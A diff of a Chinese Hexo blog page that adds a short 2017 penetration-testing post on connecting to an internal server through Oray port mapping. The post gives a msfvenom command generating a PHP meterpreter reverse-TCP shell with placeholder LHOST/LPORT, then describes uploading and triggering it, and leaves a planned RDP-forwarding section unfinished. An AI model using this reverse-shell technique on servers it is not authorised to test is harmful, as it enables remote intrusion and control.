@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="渗透,web," />
 
 
 
@@ -89,12 +89,44 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Loid's Blog">
-<meta property="og:url" content="http://loid.online/tags/原创-web-漏洞/index.html">
+<meta name="description" content="本机连接内网服务器(花生壳映射)msf反弹shell + 3389内网转发
+
+
+Msf 反弹shell
+
+花生壳映射本机ip和端口  
+老套路,生成shell先。但是这里注意的是,LHOST和LPORT是你用花生壳映射后的地址.msfvenom php/meterpreter_reverse_tcp LHOST=xxxxxx LPORT=xxxx -f raw &amp;gt; shell.php
+
+配置">
+<meta property="og:type" content="article">
+<meta property="og:title" content="本机连接内网服务器(花生壳映射)">
+<meta property="og:url" content="http://loid.online/2017/03/17/localhost-connects-others-server/index.html">
 <meta property="og:site_name" content="Loid's Blog">
+<meta property="og:description" content="本机连接内网服务器(花生壳映射)msf反弹shell + 3389内网转发
+
+
+Msf 反弹shell
+
+花生壳映射本机ip和端口  
+老套路,生成shell先。但是这里注意的是,LHOST和LPORT是你用花生壳映射后的地址.msfvenom php/meterpreter_reverse_tcp LHOST=xxxxxx LPORT=xxxx -f raw &amp;gt; shell.php
+
+配置">
+<meta property="og:image" content="http://loid.online/images/msf01.png">
+<meta property="og:image" content="http://loid.online/images/msf02.png">
+<meta property="og:image" content="http://loid.online/images/msf03.png">
+<meta property="og:updated_time" content="2017-03-17T14:38:29.459Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Loid's Blog">
+<meta name="twitter:title" content="本机连接内网服务器(花生壳映射)">
+<meta name="twitter:description" content="本机连接内网服务器(花生壳映射)msf反弹shell + 3389内网转发
+
+
+Msf 反弹shell
+
+花生壳映射本机ip和端口  
+老套路,生成shell先。但是这里注意的是,LHOST和LPORT是你用花生壳映射后的地址.msfvenom php/meterpreter_reverse_tcp LHOST=xxxxxx LPORT=xxxx -f raw &amp;gt; shell.php
+
+配置">
+<meta name="twitter:image" content="http://loid.online/images/msf01.png">
 
 
 
@@ -122,13 +154,13 @@
 
 
 
-  <link rel="canonical" href="http://loid.online/tags/原创-web-漏洞/"/>
+  <link rel="canonical" href="http://loid.online/2017/03/17/localhost-connects-others-server/"/>
 
 
 
 
 
-  <title> 标签: 原创,web,漏洞 | Loid's Blog </title>
+  <title> 本机连接内网服务器(花生壳映射) | Loid's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -153,7 +185,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left  ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -247,46 +279,169 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-collapse">
-    <div class="collection-title">
-      <h2 >
-        原创,web,漏洞
-        <small>标签</small>
-      </h2>
-    </div>
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://loid.online/2017/03/17/localhost-connects-others-server/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Loid">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Loid's Blog">
+    </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                本机连接内网服务器(花生壳映射)
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-17T22:29:31+08:00">
+                2017-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
       
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+      
+        <h2 id="本机连接内网服务器-花生壳映射"><a href="#本机连接内网服务器-花生壳映射" class="headerlink" title="本机连接内网服务器(花生壳映射)"></a>本机连接内网服务器(花生壳映射)</h2><p>msf反弹shell + 3389内网转发</p>
+<hr>
+<ul>
+<li><p>Msf 反弹shell</p>
+<ul>
+<li>花生壳映射本机ip和端口<br>  <img src="/images/msf01.png" alt="msf1"></li>
+<li>老套路,生成shell先。但是这里注意的是,LHOST和LPORT是你用花生壳映射后的地址.<pre><code>msfvenom php/meterpreter_reverse_tcp LHOST=xxxxxx LPORT=xxxx -f raw &gt; shell.php
+</code></pre></li>
+<li>配置msf<br>  <img src="/images/msf02.png" alt="msf2"></li>
+<li>上传shell并触发<br>  <img src="/images/msf03.png" alt="msf3"></li>
+</ul>
+</li>
+<li><p>3389内网转发</p>
+<ul>
+<li>待续</li>
+</ul>
+</li>
+</ul>
 
-      <h2 class="post-title">
+      
+    </div>
+
+    <div>
+      
         
-            <a class="post-title-link" href="/2017/03/12/关于我的在线工具集/" itemprop="url">
-              
-                <span itemprop="name">关于我的在线工具集</span>
-              
-            </a>
+
+      
+    </div>
+
+    <div>
+      
         
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-03-12T01:41:49+08:00"
-              content="2017-03-12" >
-          03-12
-        </time>
-      </div>
+      
+    </div>
 
-    </header>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/15/DirScanner-多线程目录扫描器/" rel="next" title="DirScanner 多线程目录扫描器">
+                <i class="fa fa-chevron-left"></i> DirScanner 多线程目录扫描器
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </article>
 
 
-    
-  </div>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
           
           </div>
@@ -294,6 +449,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -313,8 +472,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
@@ -397,6 +565,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#本机连接内网服务器-花生壳映射"><span class="nav-number">1.</span> <span class="nav-text">本机连接内网服务器(花生壳映射)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -509,6 +693,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
